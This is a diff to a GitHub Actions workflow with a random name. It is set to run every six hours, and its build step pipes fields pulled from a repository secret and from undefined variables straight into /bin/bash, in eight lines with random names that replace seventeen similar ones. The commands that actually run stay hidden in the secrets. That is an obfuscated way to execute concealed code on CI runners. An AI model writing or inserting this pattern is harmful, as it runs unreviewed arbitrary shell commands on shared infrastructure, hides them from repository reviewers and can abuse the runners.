@@ -2,7 +2,7 @@ name: commissionperturbed
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 3/6 * * *'
+    - cron: '20 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,23 +10,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: commissionperturbed
         env:
-          ryoq321: ${{ secrets.ryoq321 }}
+          wgwiy42: ${{ secrets.wgwiy42 }}
         run: |
-          echo $ryoq321 | jq -r .ramn399 | /bin/bash
-          echo $ewjcd891 | jq -r .z1 | /bin/bash
-          echo $numvy2684 | jq -r .bkjm62565 | /bin/bash
-          echo $b81692 | jq -r .joah83496 | /bin/bash
-          echo $ja89 | jq -r .qtz049 | /bin/bash
-          echo $eyfxw9 | jq -r .lta58 | /bin/bash
-          echo $re26 | jq -r .bxpj3 | /bin/bash
-          echo $mgcet10034 | jq -r .fct644 | /bin/bash
-          echo $fsyt5 | jq -r .vesqn1825 | /bin/bash
-          echo $cc88774 | jq -r .t4468 | /bin/bash
-          echo $cagt8122 | jq -r .qbjfg13 | /bin/bash
-          echo $skbe44316 | jq -r .aqu75137 | /bin/bash
-          echo $v6015 | jq -r .hofq134 | /bin/bash
-          echo $prjuu60022 | jq -r .crpg2 | /bin/bash
-          echo $v5791 | jq -r .onka96 | /bin/bash
-          echo $mbaq688 | jq -r .jvsz41419 | /bin/bash
-          echo $wvai03 | jq -r .grs77050 | /bin/bash
+          echo $wgwiy42 | jq -r .p6953 | /bin/bash
+          echo $tq47 | jq -r .ihvz1 | /bin/bash
+          echo $ciqun9295 | jq -r .tc93688 | /bin/bash
+          echo $g12114 | jq -r .zsom166 | /bin/bash
+          echo $vcqp2154 | jq -r .wpmi27 | /bin/bash
+          echo $pef890 | jq -r .r22047 | /bin/bash
+          echo $efmw3548 | jq -r .vg3 | /bin/bash
+          echo $ojsk682 | jq -r .q3 | /bin/bash
 
